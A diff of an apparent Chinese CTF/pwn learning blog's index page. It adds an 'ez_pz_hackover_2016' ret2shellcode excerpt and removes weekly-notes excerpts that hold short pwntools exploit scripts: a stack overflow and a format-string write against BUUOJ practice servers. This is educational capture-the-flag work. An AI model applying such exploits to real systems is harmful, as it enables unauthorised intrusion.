@@ -131,6 +131,68 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/ret2shellcode/ez_pz_hackover_2016/" >ez_pz_hackover_2016</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2023-10-08  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h1><p>首先对程序进行检查，发现其并没有开启NX保护，那么我们就可以通过往栈上写入shellcode并执行</p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20231008194644808.png" alt="image-20231008194644808"></p>
+<p>放入ida中进行反编译</p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20231008194722070.png" alt="image-20231008194722070"></p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20231008194736364.png" alt="image-20231008194736364"></p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20231008194747157.png" alt="image-20231008194747157"></p>
+<p>得到的函数如上所示，在chall函数中，s的缓冲区大小为0x40c（1036）个字节，而fgets函数只允许我们输入1023个字节，所以无法在chall函数里面进行栈溢出，在vuln()函数里面缓冲区大小为0x32个字节，而我们可以写入0x400个字节，可执行栈溢出。</p>
+<p>我们在vuln函数快结束的位置设置一个断点，接下来查看栈的基本情况。</p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20231008195234433.png" alt="image-20231008195234433"></p>
+	
+	</div>
+  <a type="button" href="/ret2shellcode/ez_pz_hackover_2016/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/机器学习/机器学习/" >机器学习</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2023-08-10  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		
+	
+	</div>
+  <a type="button" href="/机器学习/机器学习/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/ret2libc/[OGeek2019]babyrop/" >(OGeek2019)babyrop</a>
 		</h3>
 		</div>
@@ -454,92 +516,6 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/uncategorized/第七周笔记/" >第七周笔记</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2022-11-07  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p>这周主要是对上周的栈迁移知识点进行了更加深的一次了解，然后接着刷题。。。</p>
-<h1 id="1、jarvisoj-tell-me-something"><a href="#1、jarvisoj-tell-me-something" class="headerlink" title="1、jarvisoj_tell_me_something"></a>1、jarvisoj_tell_me_something</h1><p>首先对程序进行检查：</p>
-<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/7-1.png"></p>
-<p>为64位程序，然后没有开启canary保护，将其放入ida中进行反编译：</p>
-<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/7-2.png"><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/7-3.png"></p>
-<p>整个函数的结构比较简单，直接就是简单的栈溢出，构造的exp如下：</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
-goodgame_addr<span class="token operator">=</span><span class="token number">0x00400620</span>
-p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./guestbook'</span><span class="token punctuation">)</span>
-p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28897</span><span class="token punctuation">)</span>
-payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>goodgame_addr<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>打通的结果如下：</p>
-<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/7-4.png"></p>
-	
-	</div>
-  <a type="button" href="/uncategorized/第七周笔记/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/uncategorized/第六周笔记/" >第六周笔记</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2022-11-07  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="1、jarvisoj-fm（字符串漏洞）"><a href="#1、jarvisoj-fm（字符串漏洞）" class="headerlink" title="1、jarvisoj_fm（字符串漏洞）"></a>1、jarvisoj_fm（字符串漏洞）</h1><p>首先对程序进行检查：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-1.png"></p>
-<p>发现开启了canary保护和NX保护，首先就可以排除掉插入shellcode和返回函数，将程序放入ida进行反编译：</p>
-<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-2.png"></p>
-<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-3.png"></p>
-<p>很明显，system函数直接暴露在了我们的面前，只需要x满足等于4时即可，通过观察发现x为一个全局变量，我们通过多次运行程序，发现x的默认值为3，接下来的操作主要是找到x的地址，然后将其修改成4即可，这里与之前不同的是，我们在这次用到了fmtstr_payload(偏移，{adds1：value1})，这是32位程序常用的方法，可以构造的exp如下：</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
-p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./fm'</span><span class="token punctuation">)</span>
-p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26987</span><span class="token punctuation">)</span>
-x_addr <span class="token operator">=</span> <span class="token number">0x0804A02C</span>
-payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>x_addr<span class="token punctuation">:</span><span class="token number">0x4</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>最终打通的结果如下：</p>
-<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-4.png"></p>
-<h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2>
-	
-	</div>
-  <a type="button" href="/uncategorized/第六周笔记/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -595,6 +571,10 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
 		
 			<li><a href="/categories/ret2libc/">ret2libc<span>1</span></a></li>
 		
+			<li><a href="/categories/ret2shellcode/">ret2shellcode<span>1</span></a></li>
+		
+			<li><a href="/categories/机器学习/">机器学习<span>1</span></a></li>
+		
 			<li><a href="/categories/系统调用/">系统调用<span>1</span></a></li>
 		
 			<li><a href="/categories/系统调用-UAF/">系统调用,UAF<span>1</span></a></li>
@@ -608,33 +588,35 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/ret2VDSO/">ret2VDSO<span>1</span></a></li>
-		
-			<li><a href="/tags/C-C/">C/C++<span>1</span></a></li>
-		
-			<li><a href="/tags/字符串漏洞/">字符串漏洞<span>1</span></a></li>
-		
 			<li><a href="/tags/Java/">Java<span>1</span></a></li>
 		
 			<li><a href="/tags/系统调用/">系统调用<span>2</span></a></li>
 		
-			<li><a href="/tags/ret2dl-resolve/">ret2dl_resolve<span>1</span></a></li>
+			<li><a href="/tags/机器学习/">机器学习<span>1</span></a></li>
 		
-			<li><a href="/tags/栈溢出/">栈溢出<span>1</span></a></li>
+			<li><a href="/tags/ret2VDSO/">ret2VDSO<span>1</span></a></li>
 		
-			<li><a href="/tags/BlueKeep漏洞/">BlueKeep漏洞<span>1</span></a></li>
+			<li><a href="/tags/C-C/">C/C++<span>1</span></a></li>
 		
 			<li><a href="/tags/栈迁移/">栈迁移<span>1</span></a></li>
 		
-			<li><a href="/tags/ret2shellcode/">ret2shellcode<span>2</span></a></li>
+			<li><a href="/tags/BlueKeep漏洞/">BlueKeep漏洞<span>1</span></a></li>
 		
-			<li><a href="/tags/ret2libc/">ret2libc<span>4</span></a></li>
+			<li><a href="/tags/UAF/">UAF<span>1</span></a></li>
+		
+			<li><a href="/tags/栈溢出/">栈溢出<span>1</span></a></li>
 		
 			<li><a href="/tags/格式化字符串溢出/">格式化字符串溢出<span>1</span></a></li>
 		
+			<li><a href="/tags/ret2dl-resolve/">ret2dl_resolve<span>1</span></a></li>
+		
+			<li><a href="/tags/ret2libc/">ret2libc<span>4</span></a></li>
+		
+			<li><a href="/tags/ret2shellcode/">ret2shellcode<span>3</span></a></li>
+		
 			<li><a href="/tags/栈与堆/">栈与堆<span>1</span></a></li>
 		
-			<li><a href="/tags/UAF/">UAF<span>1</span></a></li>
+			<li><a href="/tags/字符串漏洞/">字符串漏洞<span>1</span></a></li>
 		
 		 
 		</ul>
@@ -648,6 +630,14 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/ret2shellcode/ez_pz_hackover_2016/" ><i class="fa fa-file-o"></i>ez_pz_hackover_2016</a>
+      </li>
+    
+      <li>
+        <a href="/机器学习/机器学习/" ><i class="fa fa-file-o"></i>机器学习</a>
+      </li>
+    
+      <li>
         <a href="/ret2libc/[OGeek2019]babyrop/" ><i class="fa fa-file-o"></i>(OGeek2019)babyrop</a>
       </li>
     
@@ -657,14 +647,6 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
     
       <li>
         <a href="/Java/Java基础学习/" ><i class="fa fa-file-o"></i>Java学习</a>
-      </li>
-    
-      <li>
-        <a href="/uncategorized/第一次作业/" ><i class="fa fa-file-o"></i>BlueKeep漏洞的发现与利用</a>
-      </li>
-    
-      <li>
-        <a href="/uncategorized/第二次作业/" ><i class="fa fa-file-o"></i>面向Linux系统下二进制漏洞防御技术的设计与实现</a>
       </li>
     
   </ul>
